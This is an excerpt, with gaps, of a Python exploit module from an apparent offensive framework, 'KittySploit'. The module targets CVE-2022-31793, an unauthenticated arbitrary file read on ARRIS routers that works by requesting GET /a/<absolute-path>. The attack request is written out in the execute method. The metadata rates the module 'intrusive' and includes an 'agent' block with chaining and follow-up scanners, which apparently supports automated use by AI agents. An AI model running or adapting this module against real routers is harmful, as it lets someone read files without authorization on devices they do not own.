...
class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'ARRIS Router - Arbitrary File Read (CVE-2022-31793)',
        'description': (
            'Reads arbitrary files from ARRIS routers via GET /a/<absolute-path> '
            '(CVE-2022-31793). Does not open a shell session.'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2022-31793'],
        'platform': Platform.LINUX,
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2022-31793'],
        'tags': ['arris', 'router', 'lfi', 'file-read', 'unauth', 'cve-2022-31793'],
        'agent': {
            'risk': 'intrusive',
            ...
            'chain': {
                ...
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2022_31793_detect'],
            },
        },
    }
    ...
    def execute(self, file_path: str) -> str:
        ...
        if not remote:
            return ''
        r = self.http_request(method='GET', path=f'/a/{remote}', allow_redirects=False)
    ...
    def run(self):
        ...
        print_status(f'Reading {target} via /a/ ...')
